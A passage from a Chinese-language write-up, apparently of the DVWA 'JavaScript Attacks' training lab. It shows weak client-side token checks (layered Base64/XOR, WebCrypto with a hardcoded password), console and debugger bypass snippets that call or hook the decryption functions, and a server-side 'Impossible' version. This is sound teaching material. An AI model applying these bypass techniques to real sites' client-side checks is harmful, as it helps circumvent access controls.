);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 第三层：再次Base64</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> layer3 = <span class="title function_">btoa</span>(layer2);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> layer3;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ 问题：加密函数就在旁边 ★★★</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 攻击者可以直接调用解密</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">tripleDecrypt</span>(<span class="params">encrypted</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 第三层：Base64解码</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> layer2 = <span class="title function_">atob</span>(encrypted);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 第二层：XOR</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> layer1 = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; layer2.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        layer1 += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span></span><br><span class="line"><span class="language-javascript">            layer2.<span class="title function_">charCodeAt</span>(i) ^ <span class="number">0x42</span></span></span><br><span class="line"><span class="language-javascript">        );</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 第一层：Base64解码</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> original = <span class="title function_">atob</span>(layer1);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> original;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> multiEncryptedToken = <span class="title function_">tripleEncrypt</span>(<span class="string">&quot;success&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法3：使用WebCrypto API（看似安全）</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">deriveKey</span>(<span class="params">password</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 使用Web Crypto API ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// TextEncoder - 将字符串转换为Uint8Array</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> enc = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 问题：密码仍在JavaScript中 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> keyMaterial = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">importKey</span>(</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&quot;raw&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        enc.<span class="title function_">encode</span>(password),</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&quot;PBKDF2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        [<span class="string">&quot;deriveBits&quot;</span>, <span class="string">&quot;deriveKey&quot;</span>]</span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// PBKDF2 - Password-Based Key Derivation Function 2</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 用于从密码派生密钥</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> crypto.<span class="property">subtle</span>.<span class="title function_">deriveKey</span>(</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&quot;PBKDF2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">salt</span>: enc.<span class="title function_">encode</span>(<span class="string">&quot;salt_value_12345&quot;</span>),</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">iterations</span>: <span class="number">100000</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">hash</span>: <span class="string">&quot;SHA-256&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        keyMaterial,</span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">name</span>: <span class="string">&quot;AES-GCM&quot;</span>, <span class="attr">length</span>: <span class="number">256</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        [<span class="string">&quot;encrypt&quot;</span>, <span class="string">&quot;decrypt&quot;</span>]</span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">encryptToken</span>(<span class="params">plaintext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> key = <span class="keyword">await</span> <span class="title function_">deriveKey</span>(<span class="string">&quot;my_secret_password&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> enc = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> encoded = enc.<span class="title function_">encode</span>(plaintext);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ AES-GCM加密 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> iv = crypto.<span class="title function_">getRandomValues</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">12</span>));</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> ciphertext = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">encrypt</span>(</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&quot;AES-GCM&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">iv</span>: iv</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        key,</span></span><br><span class="line"><span class="language-javascript">        encoded</span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 返回IV和密文</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">iv</span>: <span class="title class_">Array</span>.<span class="title function_">from</span>(iv),</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">ciphertext</span>: <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(ciphertext))</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ 核心问题：解密函数也在客户端 ★★★</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">decryptToken</span>(<span class="params">encrypted</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> key = <span class="keyword">await</span> <span class="title function_">deriveKey</span>(<span class="string">&quot;my_secret_password&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> iv = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(encrypted.<span class="property">iv</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> ciphertext = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(encrypted.<span class="property">ciphertext</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> plaintext = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">decrypt</span>(</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&quot;AES-GCM&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">iv</span>: iv</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        key,</span></span><br><span class="line"><span class="language-javascript">        ciphertext</span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> dec = <span class="keyword">new</span> <span class="title class_">TextDecoder</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> dec.<span class="title function_">decode</span>(plaintext);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 存储加密的token（但密码就在代码里）</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> cryptoToken = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">encryptToken</span>(<span class="string">&quot;success&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">encrypted</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    cryptoToken = encrypted;</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 表单验证</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> phrase = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;phrase&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 解密并验证</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> decrypted = <span class="keyword">await</span> <span class="title function_">decryptToken</span>(cryptoToken);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (phrase === decrypted) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;&lt;p style=&quot;color:green;&quot;&gt;✓ Correct!&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;&lt;p style=&quot;color:red;&quot;&gt;✗ Wrong!&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>代码混淆</strong> - 使用混淆器处理JavaScript</li>
+<li><strong>多层加密</strong> - Base64 + XOR + Base64</li>
+<li><strong>Web Crypto API</strong> - 使用浏览器加密API</li>
+<li><strong>复杂逻辑</strong> - 增加逆向难度</li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>根本问题：</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无论加密多复杂，解密逻辑都在客户端！</span><br></pre></td></tr></table></figure>
+
+<p><strong>具体问题：</strong></p>
+<ol>
+<li>混淆可以通过调试器分析</li>
+<li>加密密钥存储在JavaScript中</li>
+<li>解密函数可以直接调用</li>
+<li>可以在运行时拦截数据</li>
+</ol>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：反混淆工具"><a href="#方法1：反混淆工具" class="headerlink" title="方法1：反混淆工具"></a>方法1：反混淆工具</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 复制混淆的代码</span><br><span class="line"><span class="bullet">2.</span> 使用在线反混淆工具：</span><br><span class="line"><span class="bullet">   -</span> https://deobfuscate.io/</span><br><span class="line"><span class="bullet">   -</span> https://beautifier.io/</span><br><span class="line"><span class="bullet">   -</span> Chrome DevTools的Pretty Print</span><br><span class="line"><span class="bullet">3.</span> 分析反混淆后的代码</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：调试器断点"><a href="#方法2：调试器断点" class="headerlink" title="方法2：调试器断点"></a>方法2：调试器断点</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Chrome DevTools中</span></span><br><span class="line"><span class="number">1.</span> 打开<span class="title class_">Sources</span>标签</span><br><span class="line"><span class="number">2.</span> 找到验证函数</span><br><span class="line"><span class="number">3.</span> 在关键行设置断点（如<span class="keyword">return</span>语句）</span><br><span class="line"><span class="number">4.</span> 提交表单触发断点</span><br><span class="line"><span class="number">5.</span> 查看变量值</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或使用debugger语句</span></span><br><span class="line"><span class="keyword">debugger</span>;</span><br><span class="line"><span class="keyword">var</span> decrypted = <span class="keyword">await</span> <span class="title function_">decryptToken</span>(cryptoToken);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(decrypted); <span class="comment">// 查看解密结果</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：直接调用解密函数"><a href="#方法3：直接调用解密函数" class="headerlink" title="方法3：直接调用解密函数"></a>方法3：直接调用解密函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Console中</span></span><br><span class="line"><span class="comment">// 方法1：简单加密</span></span><br><span class="line"><span class="keyword">var</span> decrypted = <span class="title function_">tripleDecrypt</span>(multiEncryptedToken);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(decrypted); <span class="comment">// &quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：Crypto API</span></span><br><span class="line"><span class="title function_">decryptToken</span>(cryptoToken).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Decrypted:&#x27;</span>, result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法4：运行时拦截"><a href="#方法4：运行时拦截" class="headerlink" title="方法4：运行时拦截"></a>方法4：运行时拦截</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拦截函数调用</span></span><br><span class="line"><span class="keyword">var</span> originalFunction = tripleDecrypt;</span><br><span class="line">tripleDecrypt = <span class="keyword">function</span>(<span class="params">encrypted</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">originalFunction</span>(encrypted);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Intercepted decryption:&#x27;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或修改函数输出</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitForm&#x27;</span>).<span class="property">addEventListener</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Form validation bypassed&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>所有验证在服务器端进行，客户端无敏感逻辑。</p>
+<h3 id="前后端代码分析"><a href="#前后端代码分析" class="headerlink" title="前后端代码分析"></a>前后端代码分析</h3><p><strong>前端代码：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JavaScript Attacks - Impossible<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>JavaScript Attack Test - Impossible<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Submit the correct phrase<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;submitForm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;phrase&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phrase&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter phrase&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ Impossible: 客户端只处理UI逻辑 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 完全不包含任何敏感信息</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 不进行任何业务验证</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 获取用户输入</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> phrase = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;phrase&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ★★★ 核心改进：发送到服务器验证 ★★★</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 所有验证逻辑在服务器端</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 客户端只负责显示结果</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/validate&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// ★★★ CSRF Token ★★★</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;X-CSRF-Token&#x27;</span>: <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;csrf-token&quot;]&#x27;</span>).<span class="property">content</span></span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">phrase</span>: phrase &#125;)</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// ★★★ 显示服务器返回的结果 ★★★</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 客户端不做任何判断</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data.<span class="property">success</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;&lt;p style=&quot;color:green;&quot;&gt;✓ &#x27;</span> + data.<span class="property">message</span> + <span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;&lt;p style=&quot;color:red;&quot;&gt;✗ &#x27;</span> + data.<span class="property">message</span> + <span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;&lt;p style=&quot;color:red;&quot;&gt;Error: &#x27;</span> + error.<span class="property">message</span> + <span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 完全没有敏感数据 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 没有token</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 没有密钥</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 没有密码</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 没有业务逻辑</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>后端代码（PHP）：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 